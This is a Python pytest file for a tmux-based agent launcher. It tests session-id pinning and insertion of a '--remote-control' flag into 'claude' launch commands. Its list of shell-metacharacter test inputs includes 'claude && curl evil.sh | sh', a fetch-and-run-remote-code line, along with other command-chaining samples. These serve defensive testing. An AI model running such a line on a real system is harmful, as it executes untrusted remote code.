"""``chela.spawn`` — session-id pinning at spawn time (docs/AGENT_IDENTITY.md slice 2a)
and ``--remote-control`` insertion (CMX-375; bare since CMX-34).

No tmux: ``spawn_window``'s own tmux calls (``subprocess.run``, ``_send``) and its
collaborators (``discovery.ensure_session``, ``discovery.get_all_windows``,
``agent_manager.lock_window_name``) are all stubbed, so this exercises exactly the
wiring slice 2a adds — the uuid pinned into the sent command versus the id recorded
in the dedicated session-id store — without depending on a real tmux server (see
``tests/test_telegram_new_launch_bind.py`` for that end-to-end coverage).
"""
from __future__ import annotations

import re
import shlex
from types import SimpleNamespace

import pytest

from chela import main, spawn
from chela.dashboard import app as dash
from chela.telegram import newsession

_SESSION_RE = re.compile(r"--session-id ([0-9a-f-]{36})")

# The six override forms the brief verified against `claude --help`, both long and
# short where the CLI has both.
_OVERRIDE_COMMANDS = [
    "claude --session-id existing-id",
    "claude --resume abc-123",
    "claude -r",
    "claude --continue",
    "claude -c",
    "claude --fork-session",
    "claude --from-pr 123",
    "claude --no-session-persistence -p x",
]

_METACHARACTER_COMMANDS = [
    "claude && curl evil.sh | sh",
    "claude; echo hi",
    "claude || true",
    "claude | tee log",
    "claude `echo x`",
    "claude $(echo x)",
    "claude\necho hi",
]


class _Proc:
    def __init__(self, wid: str):
        self.returncode = 0
        self.stdout = wid
        self.stderr = ""


def _patch_tmux(monkeypatch, wid="@42", *, remote_control=False):
    """Stub every tmux/agent_manager touchpoint `spawn_window` makes, recording sends.

    ``remote_control`` defaults OFF here so the session-id tests below (written before
    CMX-375 added `--remote-control`) keep exercising exactly what they say they do,
    undisturbed by a second flag landing in the same sent command; the CMX-375 tests
    turn it on explicitly.
    """
    monkeypatch.setattr(spawn.discovery, "ensure_session", lambda: True)
    monkeypatch.setattr(spawn.discovery, "get_all_windows", lambda: {})
    monkeypatch.setattr(spawn.agent_manager, "lock_window_name", lambda *a, **kw: None)
    monkeypatch.setattr(spawn.subprocess, "run", lambda *a, **kw: _Proc(wid))
    monkeypatch.setattr(spawn.config, "remote_control_enabled", lambda: remote_control)

    sent: list[str] = []
    monkeypatch.setattr(spawn, "_send", lambda target, text: sent.append(text))
    return sent


def _launch(sent: list[str]) -> str:
    launch = [t for t in sent if t.startswith("claude")]
    assert launch, sent          # the spy must actually have recorded something
    assert len(launch) == 1
    return launch[0]


# -- _pin_session_id ---------------------------------------------------------

def test_pin_session_id_inserts_a_uuid_right_after_the_leading_claude_token():
    to_send, recorded = spawn._pin_session_id("claude", "36358c6b-1111-4a11-8888-abc123456789")
    assert to_send == "claude --session-id 36358c6b-1111-4a11-8888-abc123456789"
    assert recorded == "36358c6b-1111-4a11-8888-abc123456789"


def test_pin_session_id_inserts_before_trailing_flags_never_appends():
    to_send, recorded = spawn._pin_session_id("claude -p 'x'", "generated-uuid")
    assert to_send == "claude --session-id generated-uuid -p 'x'"
    assert recorded == "generated-uuid"


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_pin_session_id_leaves_every_override_form_untouched_and_records_nothing(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # byte-identical, not modified
    assert recorded is None            # NULL, not a fabricated id


@pytest.mark.parametrize("command", _METACHARACTER_COMMANDS)
def test_pin_session_id_refuses_to_pin_across_a_shell_metacharacter(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # sent verbatim
    assert recorded is None            # chela cannot say which process this names


# -- spawn_window integration --------------------------------------------------

def test_spawn_window_pins_and_records_a_session_id(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    m = _SESSION_RE.search(launch)
    assert m, launch
    assert launch == f"claude --session-id {m.group(1)}"
    assert spawn.sessionids.session_id_for("@42") == m.group(1)


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_spawn_window_with_an_override_command_records_no_session_id(
    monkeypatch, tmp_path, command,
):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command=command)

    assert result.ok
    launch = _launch(sent)
    assert launch == command           # untouched
    assert spawn.sessionids.session_id_for("@42") is None
    assert recorded == {}


def test_spawn_window_without_a_command_records_nothing(monkeypatch, tmp_path):
    _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )

    result = spawn.spawn_window(tmp_path)

    assert result.ok
    assert recorded == {}


def test_spawn_window_falls_back_to_an_unpinned_send_when_the_store_fails(
    monkeypatch, tmp_path,
):
    sent = _patch_tmux(monkeypatch, wid="@42")

    def _boom(wid, sid):
        raise OSError("disk full")

    monkeypatch.setattr(spawn.sessionids, "set_session_id", _boom)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok                    # the window still opens either way
    launch = _launch(sent)
    assert launch == "claude"           # sent verbatim, no --session-id
    assert "--session-id" not in launch


# -- _add_remote_control (CMX-375; bare since CMX-34) -------------------------
#
# CMX-34: the flag goes in BARE. A name froze the claude.ai/desktop sidebar title at
# launch (`shell-3` for every home-dir window); with no name Claude Code shows its own
# generated session title. Every assertion below is on the exact argv, so restoring a
# name argument — any name — turns them RED.

def test_add_remote_control_inserts_a_bare_flag_right_after_the_leading_claude_token():
    assert spawn._add_remote_control("claude") == "claude --remote-control"
    assert shlex.split(spawn._add_remote_control("claude")) == ["claude", "--remote-control"]


def test_add_remote_control_inserts_before_trailing_flags_never_appends():
    to_send = spawn._add_remote_control("claude -p 'x'")
    assert to_send == "claude --remote-control -p 'x'"


def test_add_remote_control_leaves_a_non_claude_command_untouched():
    command = "bash -c 'echo hi'"
    assert spawn._add_remote_control(command) == command


@pytest.mark.parametrize("command", ["claude 'fix the bug'", "claude mcp list"])
def test_add_remote_control_never_swallows_a_following_positional_as_the_name(command):
    """`[name]` is an OPTIONAL value: `claude --remote-control 'fix the bug'` would make
    the prompt the session name. A command whose next token is a positional is left
    untouched instead."""
    assert spawn._add_remote_control(command) == command


def test_spawn_window_adds_remote_control_by_default(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42", remote_control=True)
    monkeypatch.setattr(spawn.sessionids, "set_session_id", lambda wid, sid: None)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert "--remote-control" in launch
    # CMX-376: remote-control must be inserted into the ALREADY session-id-pinned
    # `to_send`, never re-applied to the original unpinned `command` — that would
    # silently discard the --session-id pin `_record_session_id` just succeeded at.
    # Corrupt (`_add_remote_control(to_send, ...)` -> `_add_remote_control(command, ...)`
    # in spawn_window) -> RED, since the pin would vanish from what's actually sent.
    assert "--session-id" in launch


def test_spawn_window_omits_remote_control_when_disabled(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42", remote_control=False)
    monkeypatch.setattr(spawn.sessionids, "set_session_id", lambda wid, sid: None)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert "--remote-control" not in launch


def test_spawn_window_remote_control_survives_a_command_with_no_wid(monkeypatch, tmp_path):
    """No `wid` means session-id pinning is skipped entirely — remote-control must not
    depend on it (unlike session-id, it needs nothing recorded)."""
    sent = _patch_tmux(monkeypatch, wid="no-id-here", remote_control=True)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert launch == "claude --remote-control"


# -- CMX-34: every human-facing launcher sends a BARE --remote-control ----------
#
# The dashboard launcher, Telegram `/new` and `chela spawn` all funnel into
# `spawn_window`; these drive each one from its OWN entry point, in both a home-dir cwd
# (where the old name was the frozen `shell-N` placeholder) and a project cwd (where it
# was the folder basename), and assert the argv that reaches tmux carries the flag with
# no value after it. Restore any name argument in `_add_remote_control` → RED. (The
# dashboard/main/newsession modules are imported at the top, never inside a test: the
# `subprocess.run` stub is process-global, and import-time code calls it.)

def _rc_value(launch: str) -> list[str]:
    """The argv tokens of ``launch`` with the ``--session-id <uuid>`` pin dropped, so the
    assertion is about exactly what follows ``--remote-control``."""
    argv = shlex.split(launch)
    if "--session-id" in argv:
        i = argv.index("--session-id")
        del argv[i:i + 2]
    return argv


def _via_dashboard(monkeypatch, cwd):
    monkeypatch.setattr(dash.config, "TERMINALS_ENABLED", True)
    monkeypatch.setattr(dash.launcher, "record_recent", lambda *a, **kw: None)
    r = dash.app.test_client().post("/api/agents/spawn",
                                    json={"cwd": str(cwd), "command": "claude"})
    assert r.status_code == 200, r.get_json()


def _via_telegram_new(monkeypatch, cwd):
    monkeypatch.setattr(spawn.agent_manager, "DEFAULT_LAUNCH_CMD", "claude")
    wid, err = newsession.launch_claude_window(cwd)
    assert err is None and wid


def _via_chela_spawn(monkeypatch, cwd):
    monkeypatch.setattr(main.agent_manager, "DEFAULT_LAUNCH_CMD", "claude")
    monkeypatch.setattr(main.launcher, "record_recent", lambda *a, **kw: None)
    main.cmd_spawn(SimpleNamespace(cwd=str(cwd), launch_cmd=None))


@pytest.mark.parametrize("launch_via", [_via_dashboard, _via_telegram_new, _via_chela_spawn],
                         ids=["dashboard", "telegram-new", "chela-spawn"])
@pytest.mark.parametrize("where", ["home", "project"])
def test_every_launcher_sends_a_bare_remote_control(monkeypatch, tmp_path, launch_via, where):
    home = tmp_path / "home"
    project = home / "projects" / "chelamux"
    project.mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    sent = _patch_tmux(monkeypatch, wid="@42", remote_control=True)
    monkeypatch.setattr(spawn.sessionids, "set_session_id", lambda wid, sid: None)

    launch_via(monkeypatch, home if where == "home" else project)

    assert _rc_value(_launch(sent)) == ["claude", "--remote-control"]
